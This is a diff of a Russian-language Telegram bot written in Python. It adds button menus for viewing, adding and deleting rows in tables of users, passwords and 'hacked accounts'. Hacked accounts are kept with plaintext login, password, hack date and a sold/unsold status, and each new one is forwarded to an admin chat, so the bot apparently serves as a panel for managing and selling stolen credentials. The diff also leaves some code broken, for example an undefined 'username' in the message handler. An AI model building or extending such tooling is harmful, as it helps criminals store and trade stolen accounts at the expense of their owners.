@@ -13,10 +13,8 @@ from datetime import datetime, timedelta
 from functools import wraps
 from ratelimit import limits, sleep_and_retry
 import hashlib
-import secrets
 import ipaddress
 import re
-import uuid
 
 # Настройка логирования
 logging.basicConfig(
@@ -97,7 +95,7 @@ def rate_limited_endpoint(func):
 def get_current_time():
     now = datetime.now()
     adjusted_time = now.replace(hour=20, minute=18, second=0, microsecond=0) + timedelta(hours=2)
-    if adjusted_time.day != now.day:  # Если смена дня, корректируем
+    if adjusted_time.day != now.day:
         adjusted_time = adjusted_time.replace(day=now.day)
     logger.debug(f"Время установлено: {adjusted_time}")
     return adjusted_time
@@ -496,7 +494,7 @@ def webhook():
 # /start
 @bot.message_handler(commands=['start'])
 def start_cmd(message):
-    chathasia_id = str(message.chat.id)
+    chat_id = str(message.chat.id)
     username = sanitize_input(message.from_user.username) or "Неизвестно"
     logger.info(f"/start от {chat_id}")
     access = check_access(chat_id, 'start')
@@ -1013,7 +1011,7 @@ def viewdb_cmd(message):
     finally:
         conn.close()
 
-# /database
+# /database (переписано через кнопки)
 @bot.message_handler(commands=['database'])
 def database_cmd(message):
     chat_id = str(message.chat.id)
@@ -1023,12 +1021,10 @@ def database_cmd(message):
     if access:
         bot.reply_to(message, access, parse_mode='Markdown')
         return
-    response = (
-        "🗄 *Управление базой данных*\n"
-        "Выберите действие ниже:"
-    )
-    keyboard = types.InlineKeyboardMarkup()
+    response = "🗄 *Управление базой данных*\nВыберите действие:"
+    keyboard = types.InlineKeyboardMarkup(row_width=2)
     keyboard.add(
+        types.InlineKeyboardButton("🔍 Просмотреть данные", callback_data="db_view"),
         types.InlineKeyboardButton("➕ Добавить данные", callback_data="db_add"),
         types.InlineKeyboardButton("🗑 Удалить данные", callback_data="db_delete")
     )
@@ -1041,7 +1037,7 @@ def database_cmd(message):
         logger.error(f"Ошибка /database: {e}")
         bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')
 
-@bot.callback_query_handler(func=lambda call: call.data in ['db_add', 'db_delete'])
+@bot.callback_query_handler(func=lambda call: call.data in ['db_view', 'db_add', 'db_delete'])
 def handle_database_buttons(call):
     chat_id = str(call.message.chat.id)
     logger.info(f"Кнопка {call.data} от {chat_id}")
@@ -1050,29 +1046,130 @@ def handle_database_buttons(call):
         bot.answer_callback_query(call.id)
         bot.send_message(chat_id, access, parse_mode='Markdown')
         return
-    if call.data == 'db_add':
-        keyboard = types.InlineKeyboardMarkup()
+    if call.data == 'db_view':
+        keyboard = types.InlineKeyboardMarkup(row_width=2)
+        keyboard.add(
+            types.InlineKeyboardButton("👥 Пользователи", callback_data="db_view_users"),
+            types.InlineKeyboardButton("🔐 Пароли", callback_data="db_view_credentials"),
+            types.InlineKeyboardButton("💻 Взломанные аккаунты", callback_data="db_view_hacked")
+        )
+        bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=call.message.message_id,
+            text="🔍 *Выберите таблицу для просмотра*:",
+            parse_mode='Markdown',
+            reply_markup=keyboard
+        )
+        bot.answer_callback_query(call.id)
+    elif call.data == 'db_add':
+        keyboard = types.InlineKeyboardMarkup(row_width=2)
         keyboard.add(
             types.InlineKeyboardButton("💾 В hacked", callback_data="db_add_hacked"),
             types.InlineKeyboardButton("🔐 В credentials", callback_data="db_add_cred"),
             types.InlineKeyboardButton("👤 Пользователь", callback_data="db_add_user")
         )
-        bot.send_message(
-            chat_id,
-            "➕ *Куда добавить данные?*:",
-            reply_markup=keyboard,
-            parse_mode='Markdown'
+        bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=call.message.message_id,
+            text="➕ *Куда добавить данные?*:",
+            parse_mode='Markdown',
+            reply_markup=keyboard
         )
         bot.answer_callback_query(call.id)
     elif call.data == 'db_delete':
-        msg = bot.send_message(chat_id, "📝 *Введите логин для удаления*:", parse_mode='Markdown')
-        bot.register_next_step_handler(msg, process_db_delete)
+        keyboard = types.InlineKeyboardMarkup(row_width=2)
+        keyboard.add(
+            types.InlineKeyboardButton("🔐 Удалить пароль", callback_data="db_delete_cred"),
+            types.InlineKeyboardButton("💾 Удалить hacked", callback_data="db_delete_hacked"),
+            types.InlineKeyboardButton("👤 Удалить пользователя", callback_data="db_delete_user")
+        )
+        bot.edit_message_text(
+            chat_id=chat_id,
+            message_id=call.message.message_id,
+            text="🗑 *Что удалить?*:",
+            parse_mode='Markdown',
+            reply_markup=keyboard
+        )
         bot.answer_callback_query(call.id)
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('db_view_'))
+def handle_db_view_buttons(call):
+    chat_id = str(call.message.chat.id)
+    logger.info(f"Просмотр {call.data} от {chat_id}")
+    access = check_access(chat_id, 'database')
+    if access:
+        bot.answer_callback_query(call.id)
+        bot.send_message(chat_id, access, parse_mode='Markdown')
+        return
+    conn = get_db_connection()
+    if not conn:
+        bot.send_message(chat_id, "❌ *База данных недоступна!*", parse_mode='Markdown')
+        bot.answer_callback_query(call.id)
+        return
+    try:
+        with conn.cursor() as c:
+            response = ""
+            if call.data == 'db_view_users':
+                response = "👥 *Пользователи*:\n"
+                c.execute("SELECT chat_id, prefix, username, subscription_end FROM users")
+                users = c.fetchall()
+                if not users:
+                    response += "📭 Пусто\n"
+                for chat_id_db, prefix, username_db, sub_end in users:
+                    response += (
+                        f"🆔 `{chat_id_db}`\n"
+                        f"👤 @{username_db or 'Неизвестно'}\n"
+                        f"🔑 `{prefix}`\n"
+                        f"🕒 Подписка до: {sub_end or 'Неизвестно'}\n\n"
+                    )
+            elif call.data == 'db_view_credentials':
+                response = "🔐 *Пароли*:\n"
+                c.execute("SELECT login, password, added_time FROM credentials")
+                credentials = c.fetchall()
+                if not credentials:
+                    response += "📭 Пусто\n"
+                for login, password, added_time in credentials:
+                    response += (
+                        f"🔑 `{login}`\n"
+                        f"🔒 `{password}`\n"
+                        f"🕒 Добавлено: {added_time or 'Неизвестно'}\n\n"
+                    )
+            elif call.data == 'db_view_hacked':
+                response = "💻 *Взломанные аккаунты*:\n"
+                c.execute("SELECT login, password, sold_status, hack_date FROM hacked_accounts")
+                hacked = c.fetchall()
+                if not hacked:
+                    response += "📭 Пусто\n"
+                for login, password, status, hack_date in hacked:
+                    response += (
+                        f"🔑 `{login}`\n"
+                        f"🔒 `{password}`\n"
+                        f"📊 `{status}`\n"
+                        f"🕒 Взломан: {hack_date or 'Неизвестно'}\n\n"
+                    )
+            bot.send_message(chat_id, response, parse_mode='Markdown')
+            keyboard = types.InlineKeyboardMarkup()
+            keyboard.add(
+                types.InlineKeyboardButton("🔙 Назад", callback_data="db_main_menu")
+            )
+            bot.send_message(
+                chat_id,
+                "⚙️ *Вернуться в меню базы?*:",
+                reply_markup=keyboard,
+                parse_mode='Markdown'
+            )
+        bot.answer_callback_query(call.id)
+    except Exception as e:
+        logger.error(f"Ошибка просмотра: {e}")
+        bot.send_message(chat_id, "❌ *Ошибка просмотра данных!*", parse_mode='Markdown')
+        bot.answer_callback_query(call.id)
+    finally:
+        conn.close()
 
 @bot.callback_query_handler(func=lambda call: call.data in ['db_add_hacked', 'db_add_cred', 'db_add_user'])
 def handle_db_add_buttons(call):
     chat_id = str(call.message.chat.id)
-    logger.info(f"Кнопка {call.data} от {chat_id}")
+    logger.info(f"Добавление {call.data} от {chat_id}")
     access = check_access(chat_id, 'database')
     if access:
         bot.answer_callback_query(call.id)
@@ -1095,10 +1192,57 @@ def handle_db_add_buttons(call):
         bot.register_next_step_handler(msg, process_add_user)
         bot.answer_callback_query(call.id)
 
-def process_db_delete(message):
+@bot.callback_query_handler(func=lambda call: call.data in ['db_delete_cred', 'db_delete_hacked', 'db_delete_user'])
+def handle_db_delete_buttons(call):
+    chat_id = str(call.message.chat.id)
+    logger.info(f"Удаление {call.data} от {chat_id}")
+    access = check_access(chat_id, 'database')
+    if access:
+        bot.answer_callback_query(call.id)
+        bot.send_message(chat_id, access, parse_mode='Markdown')
+        return
+    if call.data == 'db_delete_cred':
+        msg = bot.send_message(chat_id, "📝 *Введите логин для удаления из credentials*:", parse_mode='Markdown')
+        bot.register_next_step_handler(msg, process_delete_cred)
+        bot.answer_callback_query(call.id)
+    elif call.data == 'db_delete_hacked':
+        msg = bot.send_message(chat_id, "📝 *Введите логин для удаления из hacked*:", parse_mode='Markdown')
+        bot.register_next_step_handler(msg, process_delete_hacked)
+        bot.answer_callback_query(call.id)
+    elif call.data == 'db_delete_user':
+        msg = bot.send_message(chat_id, "📝 *Введите chat_id для удаления пользователя*:", parse_mode='Markdown')
+        bot.register_next_step_handler(msg, process_delete_user)
+        bot.answer_callback_query(call.id)
+
+@bot.callback_query_handler(func=lambda call: call.data == 'db_main_menu')
+def handle_db_main_menu(call):
+    chat_id = str(call.message.chat.id)
+    logger.info(f"Возврат в меню от {chat_id}")
+    access = check_access(chat_id, 'database')
+    if access:
+        bot.answer_callback_query(call.id)
+        bot.send_message(chat_id, access, parse_mode='Markdown')
+        return
+    response = "🗄 *Управление базой данных*\nВыберите действие:"
+    keyboard = types.InlineKeyboardMarkup(row_width=2)
+    keyboard.add(
+        types.InlineKeyboardButton("🔍 Просмотреть данные", callback_data="db_view"),
+        types.InlineKeyboardButton("➕ Добавить данные", callback_data="db_add"),
+        types.InlineKeyboardButton("🗑 Удалить данные", callback_data="db_delete")
+    )
+    bot.edit_message_text(
+        chat_id=chat_id,
+        message_id=call.message.message_id,
+        text=response,
+        parse_mode='Markdown',
+        reply_markup=keyboard
+    )
+    bot.answer_callback_query(call.id)
+
+def process_delete_hacked(message):
     chat_id = str(message.chat.id)
     login = sanitize_input(message.text)
-    logger.info(f"Удаление: {login} от {chat_id}")
+    logger.info(f"Удаление hacked: {login} от {chat_id}")
     if not login:
         bot.reply_to(message, "❌ *Логин не может быть пустым!*", parse_mode='Markdown')
         return
@@ -1108,13 +1252,40 @@ def process_db_delete(message):
         return
     try:
         with conn.cursor() as c:
-            c.execute("DELETE FROM credentials WHERE login = %s", (login,))
             c.execute("DELETE FROM hacked_accounts WHERE login = %s", (login,))
             if c.rowcount == 0:
                 bot.reply_to(message, "❌ *Логин не найден!*", parse_mode='Markdown')
             else:
                 conn.commit()
-                bot.reply_to(message, f"✅ *Данные для `{login}` удалены!*", parse_mode='Markdown')
+                bot.reply_to(message, f"✅ *Аккаунт `{login}` удалён из hacked!*", parse_mode='Markdown')
+    except Exception as e:
+        logger.error(f"Ошибка удаления: {e}")
+        bot.reply_to(message, "❌ *Ошибка удаления!*", parse_mode='Markdown')
+    finally:
+        conn.close()
+
+def process_delete_user(message):
+    chat_id = str(message.chat.id)
+    target_id = sanitize_input(message.text)
+    logger.info(f"Удаление пользователя: {target_id} от {chat_id}")
+    if not target_id or not target_id.isdigit():
+        bot.reply_to(message, "❌ *chat_id должен быть числом!*", parse_mode='Markdown')
+        return
+    if target_id == ADMIN_CHAT_ID:
+        bot.reply_to(message, "❌ *Нельзя удалить Создателя!*", parse_mode='Markdown')
+        return
+    conn = get_db_connection()
+    if not conn:
+        bot.reply_to(message, "❌ *База данных недоступна!*", parse_mode='Markdown')
+        return
+    try:
+        with conn.cursor() as c:
+            c.execute("DELETE FROM users WHERE chat_id = %s", (target_id,))
+            if c.rowcount == 0:
+                bot.reply_to(message, "❌ *Пользователь не найден!*", parse_mode='Markdown')
+            else:
+                conn.commit()
+                bot.reply_to(message, f"✅ *Пользователь `{target_id}` удалён!*", parse_mode='Markdown')
     except Exception as e:
         logger.error(f"Ошибка удаления: {e}")
         bot.reply_to(message, "❌ *Ошибка удаления!*", parse_mode='Markdown')
@@ -1171,6 +1342,174 @@ def process_add_cred_password(message, login):
         bot.reply_to(message, "❌ *Ошибка добавления!*", parse_mode='Markdown')
     finally:
         conn.close()
+
+def process_add_hacked_login(message):
+    chat_id = str(message.chat.id)
+    login = sanitize_input(message.text)
+    logger.info(f"Логин для hacked: {login} от {chat_id}")
+    if not login:
+        bot.reply_to(message, "❌ *Логин не может быть пустым!*", parse_mode='Markdown')
+        return
+    msg = bot.reply_to(message, "🔒 *Введите пароль*:", parse_mode='Markdown')
+    bot.register_next_step_handler(msg, lambda m: process_add_hacked_password(m, login))
+
+def process_add_hacked_password(message, login):
+    chat_id = str(message.chat.id)
+    password = sanitize_input(message.text)
+    logger.info(f"Пароль для {login} от {chat_id}")
+    if not password:
+        bot.reply_to(message, "❌ *Пароль не может быть пустым!*", parse_mode='Markdown')
+        return
+    keyboard = types.InlineKeyboardMarkup()
+    keyboard.add(
+        types.InlineKeyboardButton("✅ Продан", callback_data=f"db_hacked_status_sold_{login}_{password}"),
+        types.InlineKeyboardButton("⛔ Непродан", callback_data=f"db_hacked_status_not_sold_{login}_{password}")
+    )
+    bot.reply_to(
+        message,
+        "📊 *Выберите статус аккаунта*:",
+        reply_markup=keyboard,
+        parse_mode='Markdown'
+    )
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('db_hacked_status_'))
+def handle_db_hacked_status(call):
+    chat_id = str(call.message.chat.id)
+    logger.info(f"Статус {call.data} от {chat_id}")
+    access = check_access(chat_id, 'database')
+    if access:
+        bot.answer_callback_query(call.id)
+        bot.send_message(chat_id, access, parse_mode='Markdown')
+        return
+    try:
+        _, status, login, password = call.data.split('_', 3)
+        sold_status = "Продан" if status == "sold" else "Непродан"
+        conn = get_db_connection()
+        if not conn:
+            bot.send_message(chat_id, "❌ *База данных недоступна!*", parse_mode='Markdown')
+            bot.answer_callback_query(call.id)
+            return
+        with conn.cursor() as c:
+            c.execute(
+                '''
+                INSERT INTO hacked_accounts (login, password, hack_date, prefix, sold_status, linked_chat_id)
+                VALUES (%s, %s, %s, %s, %s, %s)
+                ON CONFLICT (login) DO UPDATE
+                SET password = EXCLUDED.password,
+                    hack_date = EXCLUDED.hack_date,
+                    prefix = EXCLUDED.prefix,
+                    sold_status = EXCLUDED.sold_status,
+                    linked_chat_id = EXCLUDED.linked_chat_id
+                ''',
+                (login, password, get_current_time().isoformat(), "Админ", sold_status, chat_id)
+            )
+            conn.commit()
+            bot.send_message(
+                chat_id,
+                f"✅ *Аккаунт `{login}` добавлен в hacked!*\n📊 *Статус*: {sold_status}",
+                parse_mode='Markdown'
+            )
+            bot.send_message(
+                ADMIN_CHAT_ID,
+                f"💾 *Аккаунт добавлен в hacked*\n👤 *Логин*: `{login}`\n🔒 *Пароль*: `{password}`\n📊 *Статус*: {sold_status}\n➕ *Добавил*: {chat_id}",
+                parse_mode='Markdown'
+            )
+        bot.answer_callback_query(call.id)
+    except Exception as e:
+        logger.error(f"Ошибка добавления: {e}")
+        bot.send_message(chat_id, "❌ *Ошибка добавления!*", parse_mode='Markdown')
+        bot.answer_callback_query(call.id)
+    finally:
+        if conn:
+            conn.close()
+
+def process_add_user(message):
+    chat_id = str(message.chat.id)
+    username = sanitize_input(message.from_user.username) or "Неизвестно"
+    try:
+        target_id, prefix = sanitize_input(message.text).split(maxsplit=1)
+        subscription_end = (get_current_time() + timedelta(days=30)).isoformat()
+        target_username = get_user(target_id)['username'] if get_user(target_id) else "Неизвестно"
+        save_user(target_id, prefix, subscription_end, target_id, target_username)
+        bot.reply_to(
+            message,
+            f"✅ *Пользователь `{target_id}` добавлен!*\n🔑 *Префикс*: `{prefix}`",
+            parse_mode='Markdown'
+        )
+        bot.send_message(
+            target_id,
+            f"🎉 *Вы добавлены в систему!*\n🔑 *Ваш префикс*: `{prefix}`",
+            parse_mode='Markdown'
+        )
+        user = get_user(chat_id)
+        if user:
+            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
+    except ValueError:
+        bot.reply_to(
+            message,
+            "❌ *Формат: chat_id префикс (например: 123456 Админ)*",
+            parse_mode='Markdown'
+        )
+    except Exception as e:
+        logger.error(f"Ошибка добавления: {e}")
+        bot.reply_to(message, "❌ *Ошибка добавления!*", parse_mode='Markdown')
+
+# /broadcast
+@bot.message_handler(commands=['broadcast'])
+def broadcast_cmd(message):
+    chat_id = str(message.chat.id)
+    username = sanitize_input(message.from_user.username) or "Неизвестно"
+    logger.info(f"/broadcast от {chat_id}")
+    access = check_access(chat_id, 'broadcast')
+    if access:
+        bot.reply_to(message, access, parse_mode='Markdown')
+        return
+    msg = bot.reply_to(
+        message,
+        "📢 *Введите сообщение для рассылки всем пользователям*:",
+        parse_mode='Markdown'
+    )
+    bot.register_next_step_handler(msg, process_broadcast_message)
+
+def process_broadcast_message(message):
+    chat_id = str(message.chat.id)
+    text = sanitize_input(message.text)
+    logger.info(f"Рассылка от {chat_id}: {text}")
+    if not text:
+        bot.reply_to(message, "❌ *Сообщение не может быть пустым!*", parse_mode='Markdown')
+        return
+    users = get_all_users()
+    if not users:
+        bot.reply_to(message, "📭 *Нет пользователей для рассылки!*", parse_mode='Markdown')
+        return
+    success_count = 0
+    fail_count = 0
+    for user_id, _, user_name in users:
+        try:
+            bot.send_message(
+                user_id,
+                f"📢 *Объявление от администрации*\n\n{text}",
+                parse_mode='Markdown'
+            )
+            success_count += 1
+            logger.info(f"Сообщение отправлено: {user_id}")
+            time.sleep(0.1)  # Защита от лимитов Telegram
+        except Exception as e:
+            logger.error(f"Ошибка отправки {user_id}: {e}")
+            fail_count += 1
+    response = (
+        f"✅ *Рассылка завершена!*\n"
+        f"👥 *Отправлено*: {success_count} пользователям\n"
+        f"❌ *Не доставлено*: {fail_count}"
+    )
+    try:
+        bot.reply_to(message, response, parse_mode='Markdown')
+        user = get_user(chat_id)
+        if user:
+            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), user['username'])
+    except Exception as e:
+        logger.error(f"Ошибка ответа: {e}")
+        bot.reply_to(message, "❌ *Ошибка завершения рассылки!*", parse_mode='Markdown')
 
 # /techstop
 @bot.message_handler(commands=['techstop'])
@@ -1285,8 +1624,8 @@ def process_adprefix_chat_id(message):
     bot.reply_to(
         message,
         f"🔑 *Выберите префикс для пользователя {target_id}*:",
-        reply_markup=keyboard,
-        parse_mode='Markdown'
+        parse_mode='Markdown',
+        reply_markup=keyboard
     )
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith('adprefix_'))
@@ -1349,31 +1688,30 @@ def process_delprefix(message):
             )
             return
         target_id, reason = parts
-        if not re.match(r'^-?\d+$', target_id):
-            bot.reply_to(
-                message,
-                "❌ *chat_id должен быть числом!*",
-                parse_mode='Markdown'
-            )
+        if not target_id.isdigit():
+            bot.reply_to(message, "❌ *chat_id должен быть числом!*", parse_mode='Markdown')
+            return
+        if target_id == ADMIN_CHAT_ID:
+            bot.reply_to(message, "❌ *Нельзя удалить префикс Создателя!*", parse_mode='Markdown')
             return
         target_user = get_user(target_id)
         if not target_user:
-            bot.reply_to(
-                message,
-                "❌ *Пользователь не найден!*",
-                parse_mode='Markdown'
-            )
+            bot.reply_to(message, "❌ *Пользователь не найден!*", parse_mode='Markdown')
             return
-        target_username = target_user['username'] or "Неизвестно"
-        save_user(target_id, "Посетитель", get_current_time().isoformat(), target_id, target_username)
+        save_user(target_id, "Посетитель", get_current_time().isoformat(), target_id, target_user['username'])
         bot.reply_to(
             message,
-            f"✅ *Подписка для `{target_id}` сброшена до `Посетитель`!*\n📝 *Причина*: {reason}",
+            f"✅ *Префикс для `{target_id}` сброшен до Посетителя!*\n📝 *Причина*: {reason}",
             parse_mode='Markdown'
         )
         bot.send_message(
             target_id,
-            f"⚠️ *Ваш префикс сброшен до `Посетитель`!*\n📝 *Причина*: {reason}",
+            f"⚠️ *Ваш префикс сброшен до Посетителя!*\n📝 *Причина*: {reason}",
+            parse_mode='Markdown'
+        )
+        bot.send_message(
+            ADMIN_CHAT_ID,
+            f"🗑 *Префикс сброшен*\n🆔 *Пользователь*: `{target_id}`\n📝 *Причина*: {reason}\n👤 *Действие от*: {chat_id}",
             parse_mode='Markdown'
         )
     except Exception as e:
@@ -1395,42 +1733,7 @@ def adduser_cmd(message):
         "📝 *Введите chat_id и префикс (через пробел, например: 123456 Админ)*:",
         parse_mode='Markdown'
     )
-    bot.register_next_step_handler(msg, process_adduser)
-
-def process_adduser(message):
-    chat_id = str(message.chat.id)
-    username = sanitize_input(message.from_user.username) or "Неизвестно"
-    try:
-        target_id, prefix = sanitize_input(message.text).split(maxsplit=1)
-        subscription_end = (get_current_time() + timedelta(days=30)).isoformat()
-        target_username = get_user(target_id)['username'] if get_user(target_id) else "Неизвестно"
-        save_user(target_id, prefix, subscription_end, target_id, target_username)
-        bot.reply_to(
-            message,
-            f"✅ *Пользователь `{target_id}` добавлен!*\n"
-            f"🔑 *Префикс*: `{prefix}`\n"
-            f"🕒 *Подписка до*: {format_time(datetime.fromisoformat(subscription_end))}",
-            parse_mode='Markdown'
-        )
-        bot.send_message(
-            target_id,
-            f"🎉 *Вы добавлены в систему!*\n"
-            f"🔑 *Ваш префикс*: `{prefix}`\n"
-            f"🕒 *Подписка до*: {format_time(datetime.fromisoformat(subscription_end))}",
-            parse_mode='Markdown'
-        )
-        user = get_user(chat_id)
-        if user:
-            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
-    except ValueError:
-        bot.reply_to(
-            message,
-            "❌ *Формат: chat_id префикс (например: 123456 Админ)*",
-            parse_mode='Markdown'
-        )
-    except Exception as e:
-        logger.error(f"Ошибка добавления: {e}")
-        bot.reply_to(message, "❌ *Ошибка выполнения команды!*", parse_mode='Markdown')
+    bot.register_next_step_handler(msg, process_add_user)
 
 # /messageuser
 @bot.message_handler(commands=['messageuser'])
@@ -1442,63 +1745,47 @@ def messageuser_cmd(message):
     if access:
         bot.reply_to(message, access, parse_mode='Markdown')
         return
-    users = get_all_users()
-    if not users:
-        bot.reply_to(message, "📭 *Нет пользователей для отправки сообщения!*", parse_mode='Markdown')
-        return
-    keyboard = types.InlineKeyboardMarkup(row_width=2)
-    for user_id, prefix, user_name in users:
-        if user_id == chat_id:
-            continue
-        user_name = user_name or "Неизвестно"
-        keyboard.add(
-            types.InlineKeyboardButton(
-                f"@{user_name} ({prefix})",
-                callback_data=f"msguser_{user_id}"
-            )
-        )
-    bot.reply_to(
+    msg = bot.reply_to(
         message,
-        "👥 *Выберите пользователя для отправки сообщения*:",
-        reply_markup=keyboard,
+        "📝 *Введите chat_id и сообщение (например: 123456 Привет)*:",
         parse_mode='Markdown'
     )
+    bot.register_next_step_handler(msg, process_messageuser)
 
-@bot.callback_query_handler(func=lambda call: call.data.startswith('msguser_'))
-def handle_messageuser_select(call):
-    chat_id = str(call.message.chat.id)
-    target_id = call.data.replace('msguser_', '')
-    logger.info(f"Выбор пользователя {target_id}")
-    msg = bot.send_message(
-        chat_id,
-        f"📝 *Введите сообщение для пользователя {target_id}*:",
-        parse_mode='Markdown'
-    )
-    bot.register_next_step_handler(msg, lambda m: process_messageuser_message(m, target_id))
-    bot.answer_callback_query(call.id)
-
-def process_messageuser_message(message, target_id):
+def process_messageuser(message):
     chat_id = str(message.chat.id)
-    text = sanitize_input(message.text)
-    logger.info(f"Сообщение для {target_id}: {text}")
-    if not text:
-        bot.reply_to(message, "❌ *Сообщение не может быть пустым!*", parse_mode='Markdown')
-        return
     try:
-        user = get_user(chat_id)
-        sender_name = user['username'] or "Создатель"
+        parts = sanitize_input(message.text).strip().split(maxsplit=1)
+        if len(parts) < 2:
+            bot.reply_to(
+                message,
+                "❌ *Формат: chat_id сообщение (например: 123456 Привет)*",
+                parse_mode='Markdown'
+            )
+            return
+        target_id, text = parts
+        if not target_id.isdigit():
+            bot.reply_to(message, "❌ *chat_id должен быть числом!*", parse_mode='Markdown')
+            return
+        target_user = get_user(target_id)
+        if not target_user:
+            bot.reply_to(message, "❌ *Пользователь не найден!*", parse_mode='Markdown')
+            return
         bot.send_message(
             target_id,
-            f"📩 *Сообщение от @{sender_name}*:\n{text}",
+            f"📩 *Сообщение от администрации*\n\n{text}",
             parse_mode='Markdown'
         )
         bot.reply_to(
             message,
-            f"✅ *Сообщение отправлено пользователю {target_id}!*",
+            f"✅ *Сообщение отправлено пользователю `{target_id}`!*",
             parse_mode='Markdown'
         )
+        user = get_user(chat_id)
+        if user:
+            save_user(chat_id, user['prefix'], user['subscription_end'], str(message.from_user.id), username)
     except Exception as e:
-        logger.error(f"Ошибка отправки: {e}")
+        logger.error(f"Ошибка /messageuser: {e}")
         bot.reply_to(message, "❌ *Ошибка отправки сообщения!*", parse_mode='Markdown')
 
 # /addhacked
@@ -1518,93 +1805,6 @@ def addhacked_cmd(message):
     )
     bot.register_next_step_handler(msg, process_add_hacked_login)
 
-def process_add_hacked_login(message):
-    chat_id = str(message.chat.id)
-    login = sanitize_input(message.text)
-    logger.info(f"Логин: {login}")
-    if not login:
-        bot.reply_to(message, "❌ *Логин не может быть пустым!*", parse_mode='Markdown')
-        return
-    msg = bot.reply_to(message, "🔒 *Введите пароль*:", parse_mode='Markdown')
-    bot.register_next_step_handler(msg, lambda m: process_add_hacked_password(m, login))
-
-def process_add_hacked_password(message, login):
-    chat_id = str(message.chat.id)
-    password = sanitize_input(message.text)
-    logger.info(f"Пароль для {login}")
-    if not password:
-        bot.reply_to(message, "❌ *Пароль не может быть пустым!*", parse_mode='Markdown')
-        return
-    keyboard = types.InlineKeyboardMarkup()
-    keyboard.add(
-        types.InlineKeyboardButton("✅ Продан", callback_data=f"add_hacked_status_sold_{login}_{password}"),
-        types.InlineKeyboardButton("⛔ Непродан", callback_data=f"add_hacked_status_not_sold_{login}_{password}")
-    )
-    bot.reply_to(
-        message,
-        "📊 *Выберите статус аккаунта*:",
-        reply_markup=keyboard,
-        parse_mode='Markdown'
-    )
-
-@bot.callback_query_handler(func=lambda call: call.data.startswith('add_hacked_status_'))
-def handle_add_hacked_status(call):
-    chat_id = str(call.message.chat.id)
-    logger.info(f"Статус {call.data}")
-    access = check_access(chat_id, 'addhacked')
-    if access:
-        bot.send_message(chat_id, access, parse_mode='Markdown')
-        bot.answer_callback_query(call.id)
-        return
-    try:
-        _, status, login, password = call.data.split('_', 3)
-        sold_status = "Продан" if status == "sold" else "Непродан"
-        conn = get_db_connection()
-        if not conn:
-            bot.send_message(chat_id, "❌ *База данных недоступна!*", parse_mode='Markdown')
-            bot.answer_callback_query(call.id)
-            return
-        with conn.cursor() as c:
-            c.execute(
-                '''
-                INSERT INTO hacked_accounts (login, password, hack_date, prefix, sold_status, linked_chat_id)
-                VALUES (%s, %s, %s, %s, %s, %s)
-                ON CONFLICT (login) DO UPDATE
-                SET password = EXCLUDED.password,
-                    hack_date = EXCLUDED.hack_date,
-                    prefix = EXCLUDED.prefix,
-                    sold_status = EXCLUDED.sold_status,
-                    linked_chat_id = EXCLUDED.linked_chat_id
-                ''',
-                (login, password, get_current_time().isoformat(), "Админ", sold_status, chat_id)
-            )
-            conn.commit()
-            bot.send_message(
-                chat_id,
-                f"✅ *Аккаунт `{login}` добавлен в hacked!*\n"
-                f"🔒 *Пароль*: `{password}`\n"
-                f"📊 *Статус*: {sold_status}\n"
-                f"🕒 *Время*: {format_time(get_current_time())}",
-                parse_mode='Markdown'
-            )
-            bot.send_message(
-                ADMIN_CHAT_ID,
-                f"💾 *Новый взломанный аккаунт*\n"
-                f"👤 *Логин*: `{login}`\n"
-                f"🔒 *Пароль*: `{password}`\n"
-                f"📊 *Статус*: {sold_status}\n"
-                f"🕒 *Добавлено*: {format_time(get_current_time())}\n"
-                f"➕ *Добавил*: {chat_id}",
-                parse_mode='Markdown'
-            )
-        bot.answer_callback_query(call.id)
-    except Exception as e:
-        logger.error(f"Ошибка добавления: {e}")
-        bot.send_message(chat_id, "❌ *Ошибка добавления!*", parse_mode='Markdown')
-        bot.answer_callback_query(call.id)
-    finally:
-        conn.close()
-
 # /addcred
 @bot.message_handler(commands=['addcred'])
 def addcred_cmd(message):
@@ -1623,22 +1823,27 @@ def addcred_cmd(message):
     bot.register_next_step_handler(msg, process_add_cred_login)
 
 # Запуск бота
-def start_bot():
-    logger.info("Запуск бота")
+if __name__ == '__main__':
     try:
+        logger.info("Инициализация базы")
+        if init_db():
+            logger.info("База готова")
+        else:
+            logger.error("Ошибка базы")
+            raise Exception("Не удалось инициализировать базу")
+        logger.info("Запуск keep_alive")
+        threading.Thread(target=keep_alive, daemon=True).start()
+        logger.info("Запуск Flask")
         bot.remove_webhook()
         time.sleep(1)
-        bot.set_webhook(url=f"{SITE_URL}/webhook", secret_token=SECRET_WEBHOOK_TOKEN)
-        logger.info(f"Вебхук установлен: {SITE_URL}/webhook")
+        webhook_url = f"{SITE_URL}/webhook"
+        bot.set_webhook(
+            url=webhook_url,
+            secret_token=SECRET_WEBHOOK_TOKEN,
+            timeout=10
+        )
+        logger.info(f"Вебхук установлен: {webhook_url}")
+        app.run(host='0.0.0.0', port=int(os.getenv('PORT', 5000)))
     except Exception as e:
-        logger.error(f"Ошибка установки вебхука: {e}")
-        return
-    threading.Thread(target=keep_alive, daemon=True).start()
-    if init_db():
-        logger.info("База данных инициализирована")
-    else:
-        logger.error("Не удалось инициализировать базу")
-    app.run(host='0.0.0.0', port=int(os.getenv('PORT', 5000)))
-
-if __name__ == '__main__':
-    start_bot()
+        logger.error(f"Критическая ошибка: {e}")
+        raise
